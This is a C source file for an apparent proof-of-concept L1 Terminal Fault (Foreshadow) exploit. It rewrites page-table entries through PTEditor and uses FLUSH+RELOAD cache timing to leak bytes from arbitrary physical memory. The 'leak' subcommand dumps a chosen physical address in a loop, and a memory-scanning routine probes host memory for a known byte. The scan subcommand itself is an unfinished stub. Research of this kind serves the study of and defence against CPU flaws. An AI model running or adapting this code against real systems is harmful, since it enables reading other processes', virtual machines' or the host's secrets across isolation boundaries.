#define _GNU_SOURCE
#include "l1tf.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "statistics.h"
#include <bits/types/siginfo_t.h>
#include <getopt.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

#define THRESHOLD 150

uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
  uint8_t result = 0;
  for (size_t nibble = 0; nibble < AMOUNT_OF_NIBBLES_PER_RELOAD; ++nibble) {
    size_t *partial_results =
        &raw_results[nibble * AMOUNT_OF_OPTIONS_IN_NIBBLE];
    size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE, partial_results);
    result |= max << (4 * nibble);
  }
  return result;
}

uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};

  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
  asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
         THRESHOLD);

  return reconstruct_nibbles(raw_results);
}

// Super fast checking of the existance of a byte at a certain address.
// Only requires a single FLUSH+RELOAD of a single address (instead
// of 32 or 256). Useful to quickly scan physical memory, assuming we know
// that a certain byte appears.
bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
                uint8_t check) {
  clflush(reload_buffer[check]);
  // clflush((void *)segfault_handler_full);
  mfence();

  asm_l1tf_leak_full(leak_addr, reload_buffer);

  size_t time = access_time(reload_buffer[check]);
  return time < THRESHOLD;
}

// Returns a pointer to the physical address where the needle was found.
void *l1tf_scan_physical_memory(size_t length, char needle[length],
                                size_t stride) {
  assert(length > 0);

  leak_addr_t leak = l1tf_leak_buffer_create();

  // First, scan quickly
  full_reload_buffer_t reload_buffer;
  for (uintptr_t ptr = 0; ptr < HOST_MEMORY_SIZE; ptr += stride) {
    if (ptr % 0x100000 == 0) {
      fprintf(stderr, "%ld MB\r", ptr / stride);
    }
    l1tf_leak_buffer_modify(&leak, (void *)ptr);
    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
      printf("%lx\n", ptr);
    }
  }

  l1tf_leak_buffer_free(&leak);
  return 0;
}

leak_addr_t l1tf_leak_buffer_create() {
  void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak_ptr != MAP_FAILED);
  assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));

  leak_addr_t leak;
  leak.leak = leak_ptr;

  ptedit_entry_t entry = ptedit_resolve(leak.leak, 0);
  leak.pte_ptr = entry.pte_ptr;
  leak.original_pfn = ptedit_get_pfn(*leak.pte_ptr);

  *leak.pte_ptr &= ~(1ull << PTEDIT_PAGE_BIT_PRESENT);
  ptedit_invalidate_tlb(leak.leak);

  return leak;
}

void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
  size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
  // ptedit_pte_set_pfn(leak->leak, 0, pfn);
  size_t current_pte = *(leak->pte_ptr);
  *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
}

void l1tf_leak_buffer_free(leak_addr_t *leak) {
  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak->leak, 0, leak->original_pfn);
  assert(!munmap(leak->leak, PAGE_SIZE));
}

void initialize_pteditor_lib() {
  fprintf(stderr, "Initializing PTEdit...\r");
  assert(!ptedit_init());
  fprintf(stderr,
          "Initialized PTEdit! Mapping physical memory to user space...\n");
  ptedit_use_implementation(PTEDIT_IMPL_USER);
}

void do_leak(const uintptr_t phys_addr, const size_t length) {
  initialize_pteditor_lib();

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
          (void *)phys_addr);

  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer =
      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);

  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = length * sizeof(uint8_t);
  uint8_t *results = malloc(results_size);
  memset(results, 0, results_size);

  printf("Results physcial addr %lx:\n", phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  while (1) {
    for (size_t j = start; j < start + length; j += 1) {
      void *leak_addr = (char *)leak.leak + j;
      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);

      if (leaked_byte != 0) {
        results[j - start] = leaked_byte;
      }
    }

    for (size_t i = 0; i < length; ++i) {
      printf("%02x ", results[i]);
    }
    printf("\r");
  }

  free(results);

  l1tf_leak_buffer_free(&leak);

  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
  ptedit_cleanup();
}

void *do_scan(uintptr_t start, uintptr_t end, size_t needle_size,
              char needle[needle_size]) {
  return NULL;
}

// If you already know a physical address that you want to leak
int main_leak(const int argc, char *argv[argc]) {
  // Parse the physcial address and the length from the
  // command line arguments
  uintptr_t phys_addr = -1;
  size_t length = -1;

  static struct option options[] = {
      {"address", required_argument, 0, 'a'},
      {"length", required_argument, 0, 'l'},
  };

  while (true) {
    int option_idx = 0;
    int choice = getopt_long(argc, argv, "a:l:", options, &option_idx);
    if (choice == -1) {
      break;
    }

    char *tail = NULL;
    switch (choice) {
    case 'a':
      phys_addr = strtoull(optarg, &tail, 16);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse physical address as hexadecimal\n");
        exit(1);
      }
      break;
    case 'l':
      length = strtoull(optarg, &tail, 10);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse length\n");
        exit(1);
      }
      break;
    }
  }

  // Make sure that both the phys_addr and length are set
  if (phys_addr == (uintptr_t)-1 || length == (size_t)-1) {
    fprintf(stderr,
            "Required arguments of leak subcommand\n"
            "\t-%c, --%s\thexadecimal physical address where you "
            "want to leak from\n"
            "\t-%c, --%s\tamount of bytes you want to leak\n",
            options[0].val, options[0].name, options[1].val, options[1].name);
    exit(1);
  }

  do_leak(phys_addr, length);
  exit(0);
}

int main_scan(const int argc, char *argv[argc]) {
  uintptr_t start_addr = -1;
  size_t length = -1;

  static struct option options[] = {
      {"start", required_argument, 0, 's'},
      {"length", required_argument, 0, 'l'},
  };
  while (true) {
    int option_idx = 0;
    int choice = getopt_long(argc, argv, "s:l:", options, &option_idx);
    if (choice == -1) {
      break;
    }

    char *tail = NULL;
    switch (choice) {
    case 's':
      start_addr = strtoull(optarg, &tail, 16);
      if (tail == optarg) {
        fprintf(stderr,
                "Failed to parse physical start address as hexadecimal\n");
        exit(1);
      }
      break;
    case 'l':
      length = strtoull(optarg, &tail, 10);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse scanning range length\n");
        exit(1);
      }
      if (length == 0) {
        fprintf(stderr, "Length cannot be 0\n");
        exit(1);
      }
      break;
    }
  }

  char needle[128];
  ssize_t needle_size = read(STDIN_FILENO, needle, 128);

  if (start_addr == (uintptr_t)-1 || length == (uintptr_t)-1 ||
      needle_size <= 0) {
    fprintf(stderr,
            "Required arguments of scan subcommand\n"
            "\t-%c, --%s\thexadecimal physcial address where you "
            "want to start scanning from\n"
            "\t-%c, --%s\tthe length of the range that you want to scan in "
            "bytes\n"
            "Make sure to pass the needle in via stdin\n",
            options[0].val, options[0].name, options[1].val, options[1].name);
    exit(1);
  }

  uintptr_t end_addr = start_addr + length;
  assert(end_addr > start_addr);

  fprintf(stderr,
          "Starting to scan for matches in the range 0x%lx-0x%lx for the "
          "string\n\t\"%s\"\n",
          start_addr, end_addr, needle);
  do_scan(start_addr, end_addr, needle_size, needle);
  exit(0);
}

int main(int argc, char *argv[argc]) {
  assert(argc > 0);

  if (argc >= 2) {
    if (!strncmp("leak", argv[1], 5)) {
      return main_leak(argc, argv);
    } else if (!strncmp("scan", argv[1], 5)) {
      return main_scan(argc, argv);
    }
  }

  fprintf(stderr,
          "Usage\n"
          "\t%s leak\n"
          "\t%s scan\n",
          argv[0], argv[0]);
  exit(1);
}
